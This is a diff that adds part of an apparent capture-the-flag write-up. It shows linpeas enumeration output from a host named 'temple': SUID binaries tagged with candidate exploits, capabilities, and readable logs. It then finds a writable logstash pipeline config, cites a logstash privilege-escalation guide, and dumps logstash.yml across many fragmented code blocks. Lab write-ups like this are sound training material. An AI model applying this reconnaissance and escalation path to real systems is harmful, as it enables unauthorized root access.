@@ -2326,3 +2326,1167 @@ netpgp Not Found
 -rw-r--r-- 1 root root 2275 Jul 27  2021 /usr/share/keyrings/ubuntu-advantage-fips.gpg
 -rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
 -rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
+-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
+-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
+-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
+-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg
+
+drwx------ 3 bill bill 4096 Jan 25 00:37 /home/bill/.gnupg
+
+╔══════════╣ Searching docker files (limit 70)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
+-rw-r--r-- 1 root root 342 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/puma-4.3.8-java/tools/docker/Dockerfile
+
+╔══════════╣ Analyzing Bind Files (limit 70)
+-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
+-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
+
+-rw-r--r-- 1 root root 977 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/ecs-v1/bind
+-rw-r--r-- 1 root root 977 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/ecs-v1/bind
+
+-rw-r--r-- 1 root root 285 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/legacy/bind
+-rw-r--r-- 1 root root 285 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/legacy/bind
+
+╔══════════╣ Analyzing Interesting logs Files (limit 70)
+-rw-r----- 1 root adm 0 Oct  4  2021 /var/log/apache2/access.log
+
+-rw-r----- 1 root adm 802 Jan 24 23:40 /var/log/apache2/error.log
+-rw-r----- 1 mysql adm 4952 Jan 24 23:40 /var/log/mysql/error.log
+
+╔══════════╣ Analyzing Windows Files (limit 70)
+
+lrwxrwxrwx 1 root root 22 Jul 24  2021 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
+lrwxrwxrwx 1 root root 24 Jul 24  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
+-rw-r--r-- 1 root root 83 Jul 24  2021 /var/lib/dpkg/alternatives/my.cnf
+
+╔══════════╣ Analyzing Other Interesting Files (limit 70)
+-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
+-rw-r--r-- 1 bill bill 3771 Apr  4  2018 /home/bill/.bashrc
+-rw-r--r-- 1 frankie frankie 3771 Jul 25  2021 /home/frankie/.bashrc
+-rw-r--r-- 1 princess princess 3771 Oct  3  2021 /home/princess/.bashrc
+-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/11316/etc/skel/.bashrc
+-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/11743/etc/skel/.bashrc
+
+-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
+-rw-r--r-- 1 bill bill 807 Apr  4  2018 /home/bill/.profile
+-rw-r--r-- 1 frankie frankie 807 Jul 25  2021 /home/frankie/.profile
+-rw-r--r-- 1 princess princess 807 Oct  3  2021 /home/princess/.profile
+-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/11316/etc/skel/.profile
+-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/11743/etc/skel/.profile
+
+═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
+                                         ╚═══════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
+-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
+-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
+-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwSr--r-- 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
+-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+-rwsr-xr-x 1 root root 116K Jun 15  2021 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-x 1 root root 427K Aug 11  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-- 1 root telnetd 11K Nov  7  2016 /usr/lib/telnetlogin
+-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/11743/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11743/bin/ping
+-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11743/bin/ping6
+-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11743/bin/su
+-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/11743/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/11743/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11743/usr/bin/chsh
+-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/11743/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/11743/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/11743/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 134K Jan 20  2021 /snap/core/11743/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2020 /snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 419K Jun  7  2021 /snap/core/11743/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 109K Aug 27  2021 /snap/core/11743/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-- 1 root dip 386K Jul 23  2020 /snap/core/11743/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/11316/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11316/bin/ping
+-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/11316/bin/ping6
+-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11316/bin/su
+-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/11316/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/11316/usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/11316/usr/bin/chsh
+-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/11316/usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/11316/usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/11316/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 134K Jan 20  2021 /snap/core/11316/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-- 1 root systemd-resolve 42K Jun 11  2020 /snap/core/11316/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 419K Jun  7  2021 /snap/core/11316/usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 109K Jun 15  2021 /snap/core/11316/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+-rwsr-xr-- 1 root dip 386K Jul 23  2020 /snap/core/11316/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
+-rwxr-sr-x 1 root ssh 355K Aug 11  2021 /usr/bin/ssh-agent
+-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
+-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
+-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
+-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
+-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11743/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11743/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/11743/usr/bin/chage
+-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/11743/usr/bin/crontab
+-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/11743/usr/bin/dotlockfile
+-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/11743/usr/bin/expiry
+-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11743/usr/bin/mail-lock
+-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11743/usr/bin/mail-touchlock
+-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11743/usr/bin/mail-unlock
+-rwxr-sr-x 1 root crontab 351K Jun  7  2021 /snap/core/11743/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/11743/usr/bin/wall
+-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11316/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11316/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/11316/usr/bin/chage
+-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/11316/usr/bin/crontab
+-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/11316/usr/bin/dotlockfile
+-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/11316/usr/bin/expiry
+-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11316/usr/bin/mail-lock
+-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11316/usr/bin/mail-touchlock
+-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11316/usr/bin/mail-unlock
+-rwxr-sr-x 1 root crontab 351K Jun  7  2021 /snap/core/11316/usr/bin/ssh-agent
+-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/11316/usr/bin/wall
+
+╔══════════╣ Checking misconfigurations of ld.so
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
+/usr/lib/x86_64-linux-gnu/libfakeroot
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+Current capabilities:
+Current: =
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Shell capabilities:
+0x0000000000000000=
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Files with capabilities (limited to 50):
+/usr/bin/mtr-packet = cap_net_raw+ep
+
+╔══════════╣ Users with capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+╔══════════╣ Unexpected in root
+/vmlinuz.old
+/initrd.img
+/swap.img
+/initrd.img.old
+/vmlinuz
+
+╔══════════╣ Files (scripts) in /etc/profile.d/
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
+total 36
+drwxr-xr-x   2 root root 4096 Oct  3  2021 .
+drwxr-xr-x 101 root root 4096 Oct  4  2021 ..
+-rw-r--r--   1 root root   96 Aug 13  2020 01-locale-fix.sh
+-rw-r--r--   1 root root  835 Jun 15  2021 apps-bin-path.sh
+-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
+-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
+-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
+-rwxr-xr-x   1 root root  873 May 11  2021 Z99-cloudinit-warnings.sh
+-rwxr-xr-x   1 root root 3417 May 11  2021 Z99-cloud-locale-test.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d
+
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No
+═╣ Credentials in fstab/mtab? ........... No
+═╣ Can I read shadow files? ............. No
+═╣ Can I read shadow plists? ............ No
+═╣ Can I write shadow plists? ........... No
+═╣ Can I read opasswd file? ............. No
+═╣ Can I write in network-scripts? ...... No
+═╣ Can I read root folder? .............. No
+
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/home/frankie/.bash_history
+/home/bill/flag1.txt
+/root/
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+/home/bill
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+-rw-r----- 1 root adm 5505 Jan 24 23:40 /var/log/cloud-init-output.log
+-rw-r----- 1 root adm 0 Jul 25  2021 /var/log/apport.log
+-rw-r----- 1 root adm 0 Oct  4  2021 /var/log/apache2/other_vhosts_access.log
+-rw-r----- 1 root adm 802 Jan 24 23:40 /var/log/apache2/error.log
+-rw-r----- 1 root adm 0 Oct  4  2021 /var/log/apache2/access.log
+
+bill@temple:/etc$ find /etc -writable 2>/dev/null
+find /etc -writable 2>/dev/null
+/etc/logstash/conf.d/logstash-sample.conf
+
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash
+
+bill@temple:/etc/logstash$ cat logstash.yml
+cat logstash.yml
+```
+```bash
+# Settings file in YAML
+#
+```
+```bash
+# Settings can be specified either in hierarchical form, e.g.:
+#
+```
+```bash
+#   pipeline:
+```
+```bash
+#     batch:
+```
+```bash
+#       size: 125
+```
+```bash
+#       delay: 5
+#
+```
+```bash
+# Or as flat keys:
+#
+```
+```bash
+#   pipeline.batch.size: 125
+```
+```bash
+#   pipeline.batch.delay: 5
+#
+```
+```bash
+# ------------  Node identity ------------
+#
+```
+```bash
+# Use a descriptive name for the node:
+#
+```
+```bash
+# node.name: test
+#
+```
+```bash
+# If omitted the node name will default to the machine's host name
+#
+```
+```bash
+# ------------ Data path ------------------
+#
+```
+```bash
+# Which directory should be used by logstash and its plugins
+```
+```bash
+# for any persistent needs. Defaults to LOGSTASH_HOME/data
+#
+path.data: /var/lib/logstash
+#
+```
+```bash
+# ------------ Pipeline Settings --------------
+#
+```
+```bash
+# The ID of the pipeline.
+#
+```
+```bash
+# pipeline.id: main
+#
+```
+```bash
+# Set the number of workers that will, in parallel, execute the filters+outputs
+```
+```bash
+# stage of the pipeline.
+#
+```
+```bash
+# This defaults to the number of the host's CPU cores.
+#
+```
+```bash
+# pipeline.workers: 2
+#
+```
+```bash
+# How many events to retrieve from inputs before sending to filters+workers
+#
+```
+```bash
+# pipeline.batch.size: 125
+#
+```
+```bash
+# How long to wait in milliseconds while polling for the next event
+```
+```bash
+# before dispatching an undersized batch to filters+outputs
+#
+```
+```bash
+# pipeline.batch.delay: 50
+#
+```
+```bash
+# Force Logstash to exit during shutdown even if there are still inflight
+```
+```bash
+# events in memory. By default, logstash will refuse to quit until all
+```
+```bash
+# received events have been pushed to the outputs.
+#
+```
+```bash
+# WARNING: enabling this can lead to data loss during shutdown
+#
+```
+```bash
+# pipeline.unsafe_shutdown: false
+#
+```
+```bash
+# Set the pipeline event ordering. Options are "auto" (the default), "true" or "false".
+```
+```bash
+# "auto" will  automatically enable ordering if the 'pipeline.workers' setting
+```
+```bash
+# is also set to '1'.
+```
+```bash
+# "true" will enforce ordering on the pipeline and prevent logstash from starting
+```
+```bash
+# if there are multiple workers.
+```
+```bash
+# "false" will disable any extra processing necessary for preserving ordering.
+#
+```
+```bash
+# pipeline.ordered: auto
+#
+```
+```bash
+# ------------ Pipeline Configuration Settings --------------
+#
+```
+```bash
+# Where to fetch the pipeline configuration for the main pipeline
+#
+```
+```bash
+# path.config:
+#
+```
+```bash
+# Pipeline configuration string for the main pipeline
+#
+```
+```bash
+# config.string:
+#
+```
+```bash
+# At startup, test if the configuration is valid and exit (dry run)
+#
+```
+```bash
+# config.test_and_exit: false
+#
+```
+```bash
+# Periodically check if the configuration has changed and reload the pipeline
+```
+```bash
+# This can also be triggered manually through the SIGHUP signal
+#
+config.reload.automatic: true
+#
+```
+```bash
+# How often to check if the pipeline configuration has changed (in seconds)
+```
+```bash
+# Note that the unit value (s) is required. Values without a qualifier (e.g. 60)
+```
+```bash
+# are treated as nanoseconds.
+```
+```bash
+# Setting the interval this way is not recommended and might change in later versions.
+#
+config.reload.interval: 3s
+#
+```
+```bash
+# Show fully compiled configuration as debug log message
+```
+```bash
+# NOTE: --log.level must be 'debug'
+#
+```
+```bash
+# config.debug: false
+#
+```
+```bash
+# When enabled, process escaped characters such as \n and \" in strings in the
+```
+```bash
+# pipeline configuration files.
+#
+```
+```bash
+# config.support_escapes: false
+#
+```
+```bash
+# ------------ HTTP API Settings -------------
+```
+```bash
+# Define settings related to the HTTP API here.
+#
+```
+```bash
+# The HTTP API is enabled by default. It can be disabled, but features that rely
+```
+```bash
+# on it will not work as intended.
+```
+```bash
+# http.enabled: true
+#
+```
+```bash
+# By default, the HTTP API is bound to only the host's local loopback interface,
+```
+```bash
+# ensuring that it is not accessible to the rest of the network. Because the API
+```
+```bash
+# includes neither authentication nor authorization and has not been hardened or
+```
+```bash
+# tested for use as a publicly-reachable API, binding to publicly accessible IPs
+```
+```bash
+# should be avoided where possible.
+#
+```
+```bash
+# http.host: 127.0.0.1
+#
+```
+```bash
+# The HTTP API web server will listen on an available port from the given range.
+```
+```bash
+# Values can be specified as a single port (e.g., `9600`), or an inclusive range
+```
+```bash
+# of ports (e.g., `9600-9700`).
+#
+```
+```bash
+# http.port: 9600-9700
+#
+```
+```bash
+# ------------ Module Settings ---------------
+```
+```bash
+# Define modules here.  Modules definitions must be defined as an array.
+```
+```bash
+# The simple way to see this is to prepend each `name` with a `-`, and keep
+```
+```bash
+# all associated variables under the `name` they are associated with, and
+```
+```bash
+# above the next, like this:
+#
+```
+```bash
+# modules:
+```
+```bash
+#   - name: MODULE_NAME
+```
+```bash
+#     var.PLUGINTYPE1.PLUGINNAME1.KEY1: VALUE
+```
+```bash
+#     var.PLUGINTYPE1.PLUGINNAME1.KEY2: VALUE
+```
+```bash
+#     var.PLUGINTYPE2.PLUGINNAME1.KEY1: VALUE
+```
+```bash
+#     var.PLUGINTYPE3.PLUGINNAME3.KEY1: VALUE
+#
+```
+```bash
+# Module variable names must be in the format of
+#
+```
+```bash
+# var.PLUGIN_TYPE.PLUGIN_NAME.KEY
+#
+```
+```bash
+# modules:
+#
+```
+```bash
+# ------------ Cloud Settings ---------------
+```
+```bash
+# Define Elastic Cloud settings here.
+```
+```bash
+# Format of cloud.id is a base64 value e.g. dXMtZWFzdC0xLmF3cy5mb3VuZC5pbyRub3RhcmVhbCRpZGVudGlmaWVy
+```
+```bash
+# and it may have an label prefix e.g. staging:dXMtZ...
+```
+```bash
+# This will overwrite 'var.elasticsearch.hosts' and 'var.kibana.host'
+```
+```bash
+# cloud.id: <identifier>
+#
+```
+```bash
+# Format of cloud.auth is: <user>:<pass>
+```
+```bash
+# This is optional
+```
+```bash
+# If supplied this will overwrite 'var.elasticsearch.username' and 'var.elasticsearch.password'
+```
+```bash
+# If supplied this will overwrite 'var.kibana.username' and 'var.kibana.password'
+```
+```bash
+# cloud.auth: elastic:<password>
+#
+```
+```bash
+# ------------ Queuing Settings --------------
+#
+```
+```bash
+# Internal queuing model, "memory" for legacy in-memory based queuing and
+```
+```bash
+# "persisted" for disk-based acked queueing. Defaults is memory
+#
+```
+```bash
+# queue.type: memory
+#
+```
+```bash
+# If using queue.type: persisted, the directory path where the data files will be stored.
+```
+```bash
+# Default is path.data/queue
+#
+```
+```bash
+# path.queue:
+#
+```
+```bash
+# If using queue.type: persisted, the page data files size. The queue data consists of
+```
+```bash
+# append-only data files separated into pages. Default is 64mb
+#
+```
+```bash
+# queue.page_capacity: 64mb
+#
+```
+```bash
+# If using queue.type: persisted, the maximum number of unread events in the queue.
+```
+```bash
+# Default is 0 (unlimited)
+#
+```
+```bash
+# queue.max_events: 0
+#
+```
+```bash
+# If using queue.type: persisted, the total capacity of the queue in number of bytes.
+```
+```bash
+# If you would like more unacked events to be buffered in Logstash, you can increase the
+```
+```bash
+# capacity using this setting. Please make sure your disk drive has capacity greater than
+```
+```bash
+# the size specified here. If both max_bytes and max_events are specified, Logstash will pick
+```
+```bash
+# whichever criteria is reached first
+```
+```bash
+# Default is 1024mb or 1gb
+#
+```
+```bash
+# queue.max_bytes: 1024mb
+#
+```
+```bash
+# If using queue.type: persisted, the maximum number of acked events before forcing a checkpoint
+```
+```bash
+# Default is 1024, 0 for unlimited
+#
+```
+```bash
+# queue.checkpoint.acks: 1024
+#
+```
+```bash
+# If using queue.type: persisted, the maximum number of written events before forcing a checkpoint
+```
+```bash
+# Default is 1024, 0 for unlimited
+#
+```
+```bash
+# queue.checkpoint.writes: 1024
+#
+```
+```bash
+# If using queue.type: persisted, the interval in milliseconds when a checkpoint is forced on the head page
+```
+```bash
+# Default is 1000, 0 for no periodic checkpoint.
+#
+```
+```bash
+# queue.checkpoint.interval: 1000
+#
+```
+```bash
+# ------------ Dead-Letter Queue Settings --------------
+```
+```bash
+# Flag to turn on dead-letter queue.
+#
+```
+```bash
+# dead_letter_queue.enable: false
+```
+```bash
+# If using dead_letter_queue.enable: true, the maximum size of each dead letter queue. Entries
+```
+```bash
+# will be dropped if they would increase the size of the dead letter queue beyond this setting.
+```
+```bash
+# Default is 1024mb
+```
+```bash
+# dead_letter_queue.max_bytes: 1024mb
+```
+```bash
+# If using dead_letter_queue.enable: true, the interval in milliseconds where if no further events eligible for the DLQ
+```
+```bash
+# have been created, a dead letter queue file will be written. A low value here will mean that more, smaller, queue files
+```
+```bash
+# may be written, while a larger value will introduce more latency between items being "written" to the dead letter queue, and
+```
+```bash
+# being available to be read by the dead_letter_queue input when items are are written infrequently.
+```
+```bash
+# Default is 5000.
+#
+```
+```bash
+# dead_letter_queue.flush_interval: 5000
+```
+```bash
+# If using dead_letter_queue.enable: true, the directory path where the data files will be stored.
+```
+```bash
+# Default is path.data/dead_letter_queue
+#
+```
+```bash
+# path.dead_letter_queue:
+#
+```
+```bash
+# ------------ Metrics Settings --------------
+#
+```
+```bash
+# Bind address for the metrics REST endpoint
+#
+```
+```bash
+# http.host: "127.0.0.1"
+#
+```
+```bash
+# Bind port for the metrics REST endpoint, this option also accept a range
+```
+```bash
+# (9600-9700) and logstash will pick up the first available ports.
+#
+```
+```bash
+# http.port: 9600-9700
+#
+```
+```bash
+# ------------ Debugging Settings --------------
+#
+```
+```bash
+# Options for log.level:
+```
+```bash
+#   * fatal
+```
+```bash
+#   * error
+```
+```bash
+#   * warn
+```
+```bash
+#   * info (default)
+```
+```bash
+#   * debug
+```
+```bash
+#   * trace
+#
+```
+```bash
+# log.level: info
+path.logs: /var/log/logstash
+#
+```
+```bash
+# ------------ Other Settings --------------
+#
+```
+```bash
+# Where to find custom plugins
+```
+```bash
+# path.plugins: []
+#
+```
+```bash
+# Flag to output log lines of each pipeline in its separate log file. Each log filename contains the pipeline.name
+```
+```bash
+# Default is false
+```
+```bash
+# pipeline.separate_logs: false
+#
+```
+```bash
+# ------------ X-Pack Settings (not applicable for OSS build)--------------
+#
+```
+```bash
+# X-Pack Monitoring
+```
+```bash
+# https://www.elastic.co/guide/en/logstash/current/monitoring-logstash.html
+#xpack.monitoring.enabled: false
+#xpack.monitoring.elasticsearch.username: logstash_system
+#xpack.monitoring.elasticsearch.password: password
+#xpack.monitoring.elasticsearch.proxy: ["http://proxy:port"]
+#xpack.monitoring.elasticsearch.hosts: ["https://es1:9200", "https://es2:9200"]
+```
+```bash
+# an alternative to hosts + username/password settings is to use cloud_id/cloud_auth
+#xpack.monitoring.elasticsearch.cloud_id: monitoring_cluster_id:xxxxxxxxxx
+#xpack.monitoring.elasticsearch.cloud_auth: logstash_system:password
+```
+```bash
+# another authentication alternative is to use an Elasticsearch API key
+#xpack.monitoring.elasticsearch.api_key: "id:api_key"
+#xpack.monitoring.elasticsearch.ssl.certificate_authority: [ "/path/to/ca.crt" ]
+#xpack.monitoring.elasticsearch.ssl.truststore.path: path/to/file
+#xpack.monitoring.elasticsearch.ssl.truststore.password: password
+#xpack.monitoring.elasticsearch.ssl.keystore.path: /path/to/file
+#xpack.monitoring.elasticsearch.ssl.keystore.password: password
+#xpack.monitoring.elasticsearch.ssl.verification_mode: certificate
+#xpack.monitoring.elasticsearch.sniffing: false
+#xpack.monitoring.collection.interval: 10s
+#xpack.monitoring.collection.pipeline.details.enabled: true
+#
+```
+```bash
+# X-Pack Management
+```
+```bash
+# https://www.elastic.co/guide/en/logstash/current/logstash-centralized-pipeline-management.html
+#xpack.management.enabled: false
+#xpack.management.pipeline.id: ["main", "apache_logs"]
+#xpack.management.elasticsearch.username: logstash_admin_user
+#xpack.management.elasticsearch.password: password
+#xpack.management.elasticsearch.proxy: ["http://proxy:port"]
+#xpack.management.elasticsearch.hosts: ["https://es1:9200", "https://es2:9200"]
+```
+```bash
+# an alternative to hosts + username/password settings is to use cloud_id/cloud_auth
+#xpack.management.elasticsearch.cloud_id: management_cluster_id:xxxxxxxxxx
+#xpack.management.elasticsearch.cloud_auth: logstash_admin_user:password
+```
+```bash
+# another authentication alternative is to use an Elasticsearch API key
